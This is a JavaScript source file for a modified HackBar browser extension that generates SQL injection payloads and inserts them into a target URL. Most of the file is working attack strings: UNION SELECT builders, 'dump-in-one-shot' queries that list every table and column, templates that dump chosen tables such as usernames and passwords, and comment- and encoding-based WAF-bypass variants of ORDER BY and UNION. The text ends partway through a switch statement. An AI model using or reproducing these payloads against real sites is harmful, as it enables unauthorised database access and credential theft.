  /*########################################################################
	#						MOD'S BY Alien Shanu                           #
    #                            11/jul/2019                                #
    ########################################################################
  */

HackBar.SQL = {
  selectionToSQLChar: function ( dbEngine )
  {
    var charStringArray = new Array();
    var txt = hackBar.getSelectedText();
    var decimal;
    for ( var c = 0 ; c < txt.length; c++ ) {
      decimal = txt.charCodeAt( c );
      charStringArray.push( decimal );
    }
    var charString = '';
    switch ( dbEngine )
    {
      case "mysql":
        charString = 'CHAR(' + charStringArray.join(',') + ')';
        break;
      case "mssql":
        charString = ' CHAR(' + charStringArray.join(') + CHAR(') + ')';
        break;
      case "oracle":
        charString = ' CHR(' + charStringArray.join(') || CHR(') + ')';
        break;
    }
    hackBar.setSelectedText( charString );
  },
    UnionSelectStatement: function ( encoding )
  {
	
	var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
    var columns = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = '';
    switch ( encoding )
    {
      case "1":
      	txt = " Union Select " + colArray.join( ',' );
        break;
      case "2":
        txt = "+UNION+SELECT+" + colArray.join( ',' );
        break;
      case "3":
        var txt = "+UNION+ALL+SELECT+" + colArray.join( ',' );
        break;
      case "4":
        txt = "+UNION+ALL+SELECT+";
				var strNull = 'null,';
				function multiString(text, count){ 
				var ret = ""; 
				for(var i = 0; i < count; i++){
					ret += text; 
				  }
					return ret;
				  };
				  var rep = multiString(strNull, columns);
				  txt = txt + rep.substr(0, rep.length-1)+"";
        break;
      case "5":
        result = colArray.join( '),(' );
		txt = "+UNION(SELECT(" + result + ")" + ")";
        break;
      case "6":
        var txt = "+Union Distinctrow Select+" + colArray.join( ',' );
        break;
      case "7":
        var txt = "+UNION+ALL+SELECT+1337" + colArray.join( ',1337' );
        break;
      case "8":
        var txt = "+UNION+ALL+SELECT+" + colArray.join( '%2c' );
        break;
      case "9":
        var txt = "+Union Select+" + colArray.join( '–+%0A,' );
        break;
      case "10":
        var txt = "+Union Select ~" + colArray.join( ',~' );
        break;
      case "11":
        var txt = "+Union Select ." + colArray.join( ',.' );
        break;
      case "12":
        var txt = "+Union Select '" + colArray.join( "','") + "'";
        break;
      }
    hackBar.setSelectedText( txt );
  },
  DIOS: function ( encoding )
  {
		var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
		var dios_1 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 1");
		var dios_2 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 2");
		var dios_3 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 3");
		var dios_4 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 4");
		var dios_5 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 5");
		var dios_6 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 6");
		var dios_7 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 7");
		var dios_8 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 8");
		var dios_9 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 9");
		var dios_10 = prefManager.getCharPref("extensions.hackbar.Dios.Dios 10");
    switch ( encoding )
    {
			case "dios1":
				txt = dios_1;
				break;
			case "dios2":
				txt = dios_2;
				break;
			case "dios3":
				txt = dios_3;
				break;
			case "dios4":
				txt = dios_4;
				break;
			case "dios5":
				txt = dios_5;
				break;
			case "dios6":
				txt = dios_6;
				break;
			case "dios7":
				txt = dios_7;
				break;
			case "dios8":
				txt = dios_8;
				break;
			case "dios9":
				txt = dios_9;
				break;
			case "dios10":
				txt = dios_10;
				break;
	}
    hackBar.setSelectedText( txt );
  },
  QUERY: function (choice)	{
		var str = choice;
		var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
		var query_1 = prefManager.getCharPref("extensions.hackbar.Query.query 1");
		var query_2 = prefManager.getCharPref("extensions.hackbar.Query.query 2");
		var query_3 = prefManager.getCharPref("extensions.hackbar.Query.query 3");
		var query_4 = prefManager.getCharPref("extensions.hackbar.Query.query 4");
		var query_5 = prefManager.getCharPref("extensions.hackbar.Query.query 5");
		var query_6 = prefManager.getCharPref("extensions.hackbar.Query.query 6");
		var query_7 = prefManager.getCharPref("extensions.hackbar.Query.query 7");
		var query_8 = prefManager.getCharPref("extensions.hackbar.Query.query 8");
		var query_9 = prefManager.getCharPref("extensions.hackbar.Query.query 9");
		var query_10 = prefManager.getCharPref("extensions.hackbar.Query.query 10");
		switch (str){
			case "query1":
				txt = query_1;
				break;
			case "query2":
				txt = query_2;
				break;
			case "query3":
				txt = query_3;
				break;
			case "query4":
				txt = query_4;
				break;
			case "query5":
				txt = query_5;
				break;
			case "query6":
				txt = query_6;
				break;
			case "query7":
				txt = query_7;
				break;
			case "query8":
				txt = query_8;
				break;
			case "query9":
				txt = query_9;
				break;
			case "query10":
				txt = query_10;
				break;
			}
		hackBar.setSelectedText( txt );
	  },
	  XSS: function (choice)	{
		var str = choice;
		var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
		var XSS_1 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 1");
		var XSS_2 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 2");
		var XSS_3 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 3");
		var XSS_4 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 4");
		var XSS_5 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 5");
		var XSS_6 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 6");
		var XSS_7 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 7");
		var XSS_8 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 8");
		var XSS_9 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 9");
		var XSS_10 = prefManager.getCharPref("extensions.hackbar.XSS.XSS 10");
		switch (str){
			case "XSS1":
				txt = XSS_1;
				break;
			case "XSS2":
				txt = XSS_2;
				break;
			case "XSS3":
				txt = XSS_3;
				break;
			case "XSS4":
				txt = XSS_4;
				break;
			case "XSS5":
				txt = XSS_5;
				break;
			case "XSS6":
				txt = XSS_6;
				break;
			case "XSS7":
				txt = XSS_7;
				break;
			case "XSS8":
				txt = XSS_8;
				break;
			case "XSS9":
				txt = XSS_9;
				break;
			case "XSS10":
				txt = XSS_10;
				break;
			}
		hackBar.setSelectedText( txt );
	  },
  /* GENERAL FUNCTIONS */
   selectionMySQLConvertUsing: function ( encoding )
  {
    var txt = hackBar.getSelectedText();
    txt = "CONVERT(" + txt + " USING " + encoding + ")";
    hackBar.setSelectedText( txt );
  },		
  
  
    selectionToUnionSelect4: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " div @s:=( concat(@c:=0x00,if((select count(*)/*!50000from*/ /*!50000information_schema*/.columns where table_schema=database/**X**/() and @c:=concat(@c, 0x3c62723e, /*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)) /*!50000union*/ select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect5: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " +DiV@x:=(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2)) /*!50000union*/+ALL+SELECT+" + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect6: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and@:=(seleCt GrOup_ConcAt(0x3c62723e,Table_name,column_name) frOm /*!50000information_schema.columns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61) /*!50000Union*/ Select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect7: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and@x:=(/*!50000SELECT */GROUP_CONCAT(/*!50000table_name*/,0x2d2d2d3e,/*!50000column_Name*/ SEPARATOR 0x3c62723e)/*!50000FROM *//*!50000INFORMATION_SCHEMA*/.ColumnS WHERE TABLE_SCHEMA=DATABASE/**!**/())  /*!50000union*/ ALL /*!50000select*/" + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect8: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " div @x:=(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(/*!50000INFORMATION_SCHEMA*/.COLUMNS)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT/**_**/(@x,0x3a20,0x3c666f6e7420636f6c6f723d677265656e3e,/*!50000table_name*/,0x202d2d20,0x3c666f6e7420636f6c6f723d7265643e,/*!50000column_name*/,0x3c62723e))))x) /*!50000Union*/ Select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect9: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and@x:=(Select+/*!50000export_set*/(5,@:=0,(select+count(*)from(/*!50000information_schema.columns*/)where@:=export_set(5,/*!50000export_set*/(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))/*!50000UNION*/ ALL SELECT " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect10: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and @s:=(select(@s)from(select(@s:=0x00),(@nr:=0),(select (0)from/*!50000information_schema*/.columns where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@s:=concat(@s,0x3c666f6e7420636f6c6f723d7265643e,lpad(@nr:=@nr%2b1,3,0x30),0x3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20,/*!50000table_name*/,0x3c2f666f6e743e3c666f6e7420636f6c6f723d677265656e3e20,/*!50000column_name*/,0x3c2f666f6e743e3c62723e))))x)/*!50000union*/ select +" + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect11: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = "and@:=(SeLeCt /*!50000GrOup_ConCat(0x3c6c693e,/*!50000TaBle_naMe,0x207e20,/*!50000ColuMn_naMe*/)FrOm /*!50000inForMatiOn_scHeMa*/.ColuMns where table_schema=database/**_**/()) /*!50000union*/ select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect12: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " or@aLi:=make_set(7,@:=0x00,(select(1)/*!50000from*/(/*!50000information_schema*/.Columns)where(Table_Schema!='Information_Schema')and@:=make_set(31,@,'<br>',/*!50000Table_Name*/,'-->',/*!50000Column_name*/)),@)/*!50000UniON*/select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect13: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and @:=(select(@)%66rom(select(@:=0x00),(select(@)%66rom(/*!50000information_schema.columns*/)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@)in(@:=concat/**alien**/(@,0x3C62723E,/*!50000table_name*/,0x3a,/*!50000column_name*/))))a)/*!50000Union*/ Select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
  selectionToUnionSelect14: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the LOCAL DIOS Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    var txt = " and @:=(select /*!50000GrOUp_ConCat(0x3c6c693e,/*!50000table_name*/,0x203a20,/*!50000column_name*/) %66rom/*!50000+information_schema.columns*/ where table_schema=database/**alien**/()) /*!50000Union*/ Select " + colArray.join( ',' );
    hackBar.setSelectedText( txt );
  },
	/* T.PRO FUNCTION */
	WichField: function (choice){
		var str = choice;
		switch (str){
			case 'main_toogle':
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('ref_toogle').setAttribute("checked",false);
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);
					break;
			case 'ref_toogle':
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('main_toogle').setAttribute("checked",false);
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);
					break;
			case 'post_toogle':
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('ref_toogle').setAttribute("checked",false);
					document.getElementById('main_toogle').setAttribute("checked",false);
					document.getElementById('base_toogle').setAttribute("checked",false);
					break;
			case 'base_toogle':
					document.getElementById(str).setAttribute("checked",true);
					document.getElementById('ref_toogle').setAttribute("checked",false);
					document.getElementById('post_toogle').setAttribute("checked",false);
					document.getElementById('main_toogle').setAttribute("checked",false);
					break;
            default:
                    txt = "ERROR";
                    break;
		}
	},
	ResizeText: function (multiplier){
	if (document.getElementById('hackBarTargetUrl').style.fontSize == "") {
		document.getElementById('hackBarTargetUrl').style.fontSize = "12px";
	}
	document.getElementById('hackBarTargetUrl').style.fontSize = parseFloat(document.getElementById('hackBarTargetUrl').style.fontSize) + (multiplier * 1) + "px";
	},
    ExecuteReplace: function (){
		if(document.getElementById('main_toogle').checked){txt = 'hackBarTargetUrl'};
		if(document.getElementById('ref_toogle').checked){txt = 'hackBarTargetUrlReferrerField'};
		if(document.getElementById('post_toogle').checked){txt = 'hackBarTargetUrlPostField'};
		if(document.getElementById('base_toogle').checked){txt = 'hackBarTargetUrlBase64Field'};

		ActiveQuery = document.getElementById(txt).value;
		if(ActiveQuery == ''){
		alert('No query found!(empty URL-FIELDS)\nPlease type in a query or deselect "all" checkbox and give a string in replace-input-field!')
		}else{
		// get query to replace
		ReplaceQuery = document.getElementById(txt).value;
		ReplaceQuery = encodeURIComponent(ReplaceQuery);
		// var UserInput = '%20';
		var UserInput = document.getElementById('rstring1').value;
		var UserInput = encodeURIComponent(UserInput);
		// get replace string input from user
		var InserString = document.getElementById('rstring2').value;
		var InserString = encodeURIComponent(InserString);
		var oldWordRegEx = new RegExp(UserInput,'g');
		var result = ReplaceQuery.replace(oldWordRegEx,InserString);
		alert(result);
		};
	},
	ToHex: function (string){
		var charStringArray = new Array;
		var decimal;
		for ( var c = 0 ; c < string.length ; c++ ) {
		  decimal = string.charCodeAt( c );
		  charStringArray.push( HackBar.Toolbox.dec2hex( decimal ) );
		}
		string = charStringArray.join( '' );
		return(string);
	},
	FromHex: function (string){
		var string = string.toLowerCase();
		string = string.replace( /%/g, '' );
		string = string.replace( /[^0-9abcdefg]/g, '' );

		var charStringArray = new Array();
		var buffer = '';
		var result = '';
		for ( var c = 0 ; c < string.length ; c++ ) {
		  buffer += string.charAt( c ).toString();
		  if ( buffer.length >= 2 ) {
			result += String.fromCharCode( HackBar.Toolbox.hex2dec( buffer ) );
			buffer = '';
		  }
		}
		return(result);
	},
	ExecuteReplaceTest: function (){
		// get active field
		if(document.getElementById('main_toogle').checked){txt = 'hackBarTargetUrl'};
		if(document.getElementById('ref_toogle').checked){txt = 'hackBarTargetUrlReferrerField'};
		if(document.getElementById('post_toogle').checked){txt = 'hackBarTargetUrlPostField'};
		var ReplaceQuery = document.getElementById(txt).value;

		var ReplaceQuery = ReplaceQuery.replace( new RegExp(/\n/g), '[X]' );
		var ReplaceQuery = ReplaceQuery.replace( new RegExp(/\r/g), '[Y]' );


		var UserInput = document.getElementById('rstring1').value;
		var InserString = document.getElementById('rstring2').value;
		// check if "all" checkbox is checked
		if(document.getElementById('replace_check').checked){
			// check if fields are filled
			if(ReplaceQuery == '' && UserInput == '' && InserString == ''){
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Query field!\n2) Replace string!\n3) Replacing string!')
			};
			// check if fields are filled
			if(ReplaceQuery != '' && UserInput == '' && InserString == ''){
				alert('[Replace Error-Message #2]\n\nPlease enter:\n1) Replace string!\n2) Replacing string!')
			};
			if(ReplaceQuery != '' && UserInput != '' && InserString == ''){
				alert('[Replace Error-Message #3]\n\nPlease enter:\nReplacing string!')
			}
			if(ReplaceQuery != '' && UserInput == '' && InserString != ''){
				alert('[Replace Error-Message #4]\n\nPlease enter:\nReplace string!')
			}
			if(ReplaceQuery == '' && UserInput != '' && InserString == ''){
				alert('[Replace Error-Message #5]\n\nPlease enter:\nReplacing string!')
			}
			if(ReplaceQuery == '' && UserInput == '' && InserString != ''){
				alert('[Replace Error-Message #6]\n\nPlease enter:\n1) Query field!\n2) Replace string!')
			}
			if(ReplaceQuery == '' && UserInput != '' && InserString != ''){
				alert('[Replace Error-Message #7]\n\nPlease enter:\n1) Query field!')
			}
			if(ReplaceQuery != '' && UserInput != '' && InserString != ''){
				//fields to hex
				var UserInput = HackBar.SQL.ToHex(UserInput);
				var InserString = HackBar.SQL.ToHex(InserString);
				var ReplaceQuery = HackBar.SQL.ToHex(ReplaceQuery);
				// Regex with hex
				var oldWordRegEx = new RegExp(UserInput,'g');
				var result = ReplaceQuery.replace(oldWordRegEx,InserString);
				var result = HackBar.SQL.FromHex(result);
				// replaced hex result to string
				var result = result.replace( new RegExp(/\[X]/g), '\n' );
				var result = result.replace( new RegExp(/\[Y]/g), '\r' );
				document.getElementById(txt).value = result;
			};
		}else{
			var UserInput = document.getElementById('rstring1').value;
			var InserString = document.getElementById('rstring2').value;
			// check if fields are filled
			if(UserInput == '' && InserString == ''){
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replace string!\n2) Replacing string!')
			};
			if(UserInput != '' && InserString == ''){
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replacing string!')
			};
			if(UserInput == '' && InserString != ''){
				alert('[Replace Error-Message #1]\n\nPlease enter:\n1) Replace string!')
			};
			if(UserInput != '' && InserString != ''){
				var ReplaceQuery = hackBar.getSelectedText();
				if(ReplaceQuery == ""){alert('[Replace Error-Message]\n\nMarked text is empty!\nPlease mark a text or select "all" checkbox for replacing in whole query!')};
				//fields to hex
				var UserInput = HackBar.SQL.ToHex(UserInput);
				var InserString = HackBar.SQL.ToHex(InserString);
				var ReplaceQuery = HackBar.SQL.ToHex(ReplaceQuery);
				// Regex with hex
				var oldWordRegEx = new RegExp(UserInput,'g');
				var result = ReplaceQuery.replace(oldWordRegEx,InserString);
				var result = HackBar.SQL.FromHex(result);
				hackBar.setSelectedText( result );
			};
		};
	},
	  /* T.PRO STATEMENTS FUNCTION */
      statementsTpro: function (choice)	{
		var str = choice;
		switch (str){

// BASIC STATEMENTS
case 'Basic statements1': txt = "CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())";
					break;
//TABLES
			case 'Tables1':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + dbNameFinal + ")";
					break;
//COLUMNS
			case 'Columns1':
					var tblName = prompt("Table name","");
                    var tblNameFinal = "0x";
                    if(tblName == ""){tblNameFinal="[INSERT_TABLE]";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < tblName.length; i++){
                          tblNameFinal += tblName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + tblNameFinal + ")";
					break;

			case 'Columns2':
					var tblName = prompt("Table name","");
                    var tblNameFinal = "0x";
                    if(tblName == ""){tblNameFinal="[INSERT_TABLE]";}
                    else{
                        // Convert DB name to hex
                        for (var i = 0; i < tblName.length; i++){
                          tblNameFinal += tblName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + tblNameFinal + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
					break;
//DATA
			case 'Data1': 
					var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,0x3a,column_2,0x3a,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					}
					txt = "(SELECT+GROUP_CONCAT(" + cols + "+SEPARATOR+0x3c62723e)+FROM+" + dbANDtable + ")";
					break;
			case 'Data2': 
			        var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,0x3a,column_2,0x3a,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					}					
					txt = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x)";
					break;
					
					case 'Data3':
			        var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,column_2,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					} 			       				
					txt = "(SELECT+GROUP_CONCAT(0x3c62723e," + cols + ")+FROM (" + dbANDtable + "))";
					break;
			case 'Data4':
			        var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
					var table = prompt("Insert table name","TABLE_NAME to dump");
					var cols = prompt("Insert columns to dump","column_1,column_2,column_3");					
					if(Db == ""){dbANDtable=table;}
					if(Db == "DATABASE()"){dbANDtable=table;}
					else{
					dbANDtable=Db + "." + table;					
					} 			       				
					txt = "concat(0x416c69656e205368616e75203a3a20,version(),0x3a3a3a,user(),0x3a3a3a,database(),(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + cols + ",0x3c62723e))))x))";
					break;
					
// join method					
					case 'Join Method': 
					txt = "union select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d join(select 5)e join(select 6)f join(select 7)g join(select 8)h join(select 9)i join(select 10)j join(select  11)k join(select 12)l join(select 13)m join(select 14)n join(select 15)o join(select 16)p join(select 17)q join(select 18)r join(select 19)s join(select 20)t join(select 21)u";
					break;
					
// local variable dios

      case 'LD1':
			txt = "concat( 0x3c62723e, version(),0x3a3a20416c69656e205368616e75,0x3c62723e64617461626173653a20,DataBasE/**X**/(),0x3c62723e757365723a20,UsEr/**X**/(), @s)";
		  break;		
      case 'LD2':
            txt = "@x";
          break;
      case 'LD3':
            txt = "@";
          break;
      case 'LD4':
            txt = "concat(0x496e6a656374656420427920416c69656e5f5368616e75203c62723e,user/**_**/(),0x3c62723e,database/**_**/(),0x3c62723e,version(),@x)";
          break;
      case 'LD5':
            txt = "concat/**_**/(0x222f3e272f3e3c62723e,version(),0x203a3a20416c69656e5f5368616e753c62723e,@x)";
          break;
      case 'LD6':
            txt = "@x";
          break;
      case 'LD7':
            txt = "@s";
          break;
      case 'LD8':
            txt = "ConCat(0x3a3a3a20496e6a656374656420627920416c69656e5f5368616e75203a3a3a3a203c62723e,@)";
          break;    
      case 'LD9':
            txt = "concat('ALieN_ShANu<br>',version(),'<br>','User::| ',User/**_**/(),'<br>','Database::| ',database/**_**/(),'<br>',@sHanU) ";
          break;
      
      case 'LD10':
            txt = "ConCat/**alien**/(0x496e6a656374656420427920416c69656e5f5368616e753a3a3a3a3a3a,version(),0x3c62723e75736572203a3a20,user/**alien**/(),0x3c62723e4461746162617365203a3a20,database/**alien**/(),@)";
          break;
      case 'LD11':
            txt = "@";
          break;	
      case 'LD12':
            txt = "'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set (511,@,0x3c6c693E,username,password)),@)--+";
          break;		  
					
		case 'PWD1':
                    var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
                    var table = prompt("Insert table name","TABLE_NAME to dump");
                    var cols = prompt("Insert columns to dump","column_1,column_2,column_3");         
                    if(Db == ""){dbANDtable=table;}
                    if(Db == "DATABASE()"){dbANDtable=table;}
                    else{
                    dbANDtable=Db + "." + table;          
                    }                     
                    txt = " +DiV@x:=(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT/**X**/(0x20,@x," + cols + ",0x3c62723e))))x) /*!50000union*/+ALL+SELECT+";
                    break;
            case 'PWD2':
                    var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
                    var table = prompt("Insert table name","TABLE_NAME to dump");
                    var cols = prompt("Insert columns to dump","column_1,column_2,column_3");         
                    if(Db == ""){dbANDtable=table;}
                    if(Db == "DATABASE()"){dbANDtable=table;}
                    else{
                    dbANDtable=Db + "." + table;          
                    }                     
                    txt = " +DiV@x:=concat/**X**/((SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM(" + dbANDtable + ")WHERE(@x)IN(@x:=CONCAT/**X**/(0x20,@x," + cols + ",0x3c62723e))))x),(Select+export_set(5,@:=0,(select+count(*)from(/*!50000information_schema*/.columns)where@:=export_set(5,export_set(5,@,/*!50000table_name*/,0x3c6c693e,2),/*!50000column_name*/,0xa3a,2)),@,2))) /*!50000union*/+ALL+SELECT+";
                    break;
            case 'PWD3':
                    var Db = prompt("Insert db name (or leave for current DB())","DATABASE()");
                    var table = prompt("Insert table name","TABLE_NAME to dump");
                    var cols = prompt("Insert columns to dump","column_1,column_2,column_3");         
                    if(Db == ""){dbANDtable=table;}
                    if(Db == "DATABASE()"){dbANDtable=table;}
                    else{
                    dbANDtable=Db + "." + table;          
                    }                     
                    txt = " and @s:=(select(@s)from(select(@s:=0x00),(select(@s)from(" + dbANDtable + ")where(@s)in(@s:=concat(@s," + cols + ",0x3c62723e))))x)/*!50000union*/ select +";
                    break;			
					
					
										
					
					

// WAF BASED  / ORDERBY

			case 'ORDERBY1': txt = "/**/ORDER/**/BY/**/";
					break;

	        case 'ORDERBY2': txt = "/*!order*/+/*!by*/";
					break;

            case 'ORDERBY3': txt = "/*!ORDER BY*/";
					break;

            case 'ORDERBY4': txt = "/*!50000ORDER*//**//*!50000BY*/";
                    break;

            case 'ORDERBY5': txt = "/*!12345ORDER*/+/*!BY*/";
					break;

            case 'ORDERBY6': txt = "/*!50000ORDER BY*/";
					break;

            case 'ORDERBY7': txt = "/**/**/ORDER/**/BY/**/**/";
					break;
			case 'ORDERBY8': txt = "order/**_**/by";
					break;		
 //WAF BASED/ UNION

			case 'UNION1': txt = "/*!50000%55nIoN*/ /*!50000%53eLeCt*/";
					break;
 
            case 'UNION2': txt = "%55nion(%53elect 1,2,3)";
					break;

            case 'UNION3': txt = "+union+distinct+select+";
					break;

            case 'UNION4': txt = "+union+distinctROW+select+";
					break;

            case 'UNION5': txt = "+ #?uNiOn + #?sEleCt";
					break;
 
            case 'UNION6': txt = "+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt";
					break;

